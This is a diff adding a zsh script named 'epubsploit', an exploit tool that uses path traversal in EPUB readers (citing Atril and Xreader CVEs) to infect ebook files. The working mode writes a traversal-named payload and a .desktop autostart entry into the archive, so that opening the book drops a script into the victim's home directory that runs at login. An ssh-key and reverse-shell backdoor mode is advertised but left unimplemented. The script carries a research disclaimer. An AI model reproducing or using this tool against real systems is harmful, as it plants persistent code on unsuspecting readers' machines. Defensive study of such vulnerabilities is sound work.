@@ -1,0 +1,199 @@
+#!/usr/bin/zsh
+################################################################################
+fid='$Id: epubsploit v0.3 2024-02-01 02:33:18 +0100 .m0rph $'
+################################################################################
+
+key=file
+me=${0##**/}
+#EPUB_NAME="aldous-huxley.brave-new-world.epub"
+
+# check parameters
+[[ $1 == '-b' ]] && key=mode
+[[ $# > 1 ]] && {
+   typeset -A args
+   args=(
+      [epub]=$2
+      [$key]=$3
+   )
+   #print -l $me': ${args[epub]}: '${args[epub]}
+   #print -l $me': ${args['$key']}: '${args[$key]}
+}
+
+#print -l $me': we have '$#' parameters ... '
+#exit 0
+
+e_exit() {
+   br="\e[01;31m"
+   by="\e[01;33m"
+   typeset -A exit_status=(
+      [1]=$br'[!] '${args[epub]}' does not exist. Exiting !!!'
+      [2]=$br'[!] '${args[epub]}' is not writable. Exiting !!!'
+      [3]=$br'[!] '${args[epub]}' is not an epub document. Exiting !!!'
+      [4]=$br'[!] Cannot create temporary directory. Exiting !!!'
+      [5]=$br'[!] Cannot create temporary inject file. Exiting !!!'
+      [6]=$br'[!] Cannot change permissions on inject file. Exiting !!!'
+      [7]=$br'[!] Cannot append inject file to epub archive. Exiting !!!'
+      [8]=$br'[!] Cannot transform inject filename. Exiting !!!'
+      [9]=$by'[-] Cannot remove inject filename.'
+   )
+   print -l $exit_status[$1]
+   [[ $1 < 8 ]] && exit $1
+}
+s_exit() {
+   gr="\e[01;92m"
+   typeset -A exit_status=(
+      [1]=$fid
+      [2]=$gr'[+] '${args[epub]}' successfully written. Infection complete. 💀'
+   )
+   print -l $exit_status[$1]
+   exit 0
+}
+
+# sub section
+version() { 
+# print file ID
+   m_exit 1
+   exit 0
+}
+usage() {
+# print help screen
+   cat <<EOS
+$fid
+
+Usage: $me [-bhiv] file.epub [destination]
+
+Options:
+   -h    Show this help and exit
+   -v    Show version (file ID) and exit
+   -i    Mode: simple file inclusion (funny ops)
+   -b    Mode: install backdoor (autostart|ssh|reverse shell)
+
+Description:
+   $me uses a mecanism called "path traversal attack" in order to
+   infect epub documents with files, which are extracted from the epub archive
+   and stored on the victims computer.
+
+   https://cve.mitre.org/
+      - CVE-2023–44451 (Xreader) (Reserved)
+      - CVE-2023-44452 (Reserved)
+      - CVE-2023–52076 (Atril)
+      - CVE-2023-51698 (Atril)
+
+   Sources:
+      https://www.zerodayinitiative.com/advisories/ZDI-23-1835/
+      https://github.com/febinrev/slippy-book-exploit.git
+      https://febinj.medium.com/
+
+Disclaimer:
+   This Proof of Concept (PoC) is intended for research and educational purposes
+   only. Any actions taken based on the information provided in this gist are
+   solely at the user's own risk. The vulnerabilities described in this report
+   should not be exploited in any unauthorized or malicious manner. The authors
+   and contributors are not responsible for any misuse or damage that may
+   result from the use of this information.
+
+   Please keep in mind that using malicious software and causing damage at
+   foreign systems without being ordered or charged is ILLEGAL and will result in
+   law enforcement! The worst case is that you end up in PRISON!
+
+
+Examples:
+   % $me -i huxley.epub hello-script
+   % $me -b huxley.epub autostart-script autostart
+   % $me -b huxley.epub ssh-key-script ssh
+   % $me -h
+   % $me -v
+EOS
+exit 0
+}
+
+chk_epub() {
+   [[ ! -f "${args[epub]}" ]] && e_exit 1 # epub document does not exist
+   [[ ! -w "${args[epub]}" ]] && e_exit 2 # epub document is not writable
+   is_epub=$(file -b "${args[epub]}" 2>/dev/null)
+   [[ "$is_epub" != 'EPUB document' ]] && e_exit 3 # it's not an epub document
+}
+
+mktmp() {
+   local sfile=$1                      # inject file
+   local spath=''                      # autostart path
+   local tpath='XXYXXYXXYXXYXXYXXYXXY' # traversal path
+   local pself='procYselfYcwdY'        # $PWD
+   [[ $2 ]] && {
+      spath='.configYautostartY'
+      sfile="desktop-login${RANDOM}.desktop"
+   }
+   local file=$(
+      echo "${tpath}${pself}${spath}${sfile}" | tr '/' 'Y' | sed -e 's/YY/Y/g'
+   )
+   printf '%s' "$file"
+}
+mktpath() {
+   rpath=$(echo "$1" | sed -e 's/XXY/..\//g; s/Y/\//g; s/\//\\\//g')
+   printf '%s' "$rpath"
+}
+epub_name() {
+   local tpl=$(cat "${args[file]}")
+   tpl=$(echo $tpl | sed -e "s/{EPUB_NAME}/${args[epub]}/g")
+   echo "$tpl" > "$1/$2" || e_exit 5
+}
+
+mkstarter() {
+   cat<<EOS
+[Desktop Entry]
+Version=1.0
+Encoding=UTF-8
+Type=Application
+Name=$1
+Exec=bash -c "$2"
+Path=~/
+Terminal=false
+StartupNotify=false
+EOS
+}
+
+backdoor_hack() {
+   chk_epub
+   # Comin' soon
+}
+
+funny_ops() {
+   chk_epub
+   local name='hello-hello'
+   local cmd='chmod 0700 ~/hello-hello; ~/hello-hello 1'
+   efile=$(mktmp "${args[file]}")
+   sfile=$(mktmp "${args[file]}" true)
+   scnt=$(mkstarter "$name" "$cmd")
+   epath=$(mktpath "$efile")
+   spath=$(mktpath "$sfile")
+   tmpdir='/tmp/eps.'$(mktemp -u | sha256sum | cut -d' ' -f1)
+   mkdir "$tmpdir"                                 || e_exit 4
+   epub_name "$tmpdir" "$efile"
+   print -n "$scnt" > "$tmpdir/$sfile" 2>/dev/null || e_exit 5
+   chmod 777 "$tmpdir/$efile" "$tmpdir/$sfile"     || e_exit 6
+   zip -q -j -u "${args[epub]}" $tmpdir/*          || e_exit 7
+   sed -i "s/$efile/$epath/" "${args[epub]}"       || e_exit 8
+   sed -i "s/$sfile/$spath/" "${args[epub]}"       || e_exit 8
+   rm -rf "$tmpdir"                                || e_exit 9
+   unzip -l "${args[epub]}"
+   s_exit 2
+}
+
+################################################################################
+# main section
+
+
+[[ $1 == '-h' ]] && usage     # Print help an usage instructions
+[[ $1 == '-v' ]] && version   # Only print version (file ID)
+if [[ $key == 'file' ]]; then
+   print -l '[+] OK, we do a bit funny ops ...'
+   funny_ops
+else
+   print -l '[+] Preparing a backdoor hack ...'
+   backdoor_hack
+fi
+
+
+exit 0
+
+# EOF
